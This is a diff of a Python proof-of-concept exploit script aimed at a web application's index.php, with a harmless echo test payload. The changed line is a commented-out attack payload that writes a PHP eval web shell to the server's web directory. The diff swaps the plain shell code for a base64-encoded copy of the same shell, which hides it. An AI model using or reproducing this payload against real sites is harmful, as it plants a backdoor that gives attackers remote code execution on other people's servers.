@@ -22,7 +22,7 @@ def poc(url):
 	url = str(fix_url(url))
 	print 'test:',url
 	verivy_payload = "echo 'rivir_test_backdoor';"
-	#attack_payload = "echo 'rivir_test_backdoor';file_put_contents('e:/webapp/1.php','<?php @eval($_POST[a]);?>');"
+	#attack_payload = "echo 'rivir_test_backdoor';file_put_contents('e:/webapp/1.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=='));"
 
 	url = url + "/index.php"
 	headers = {
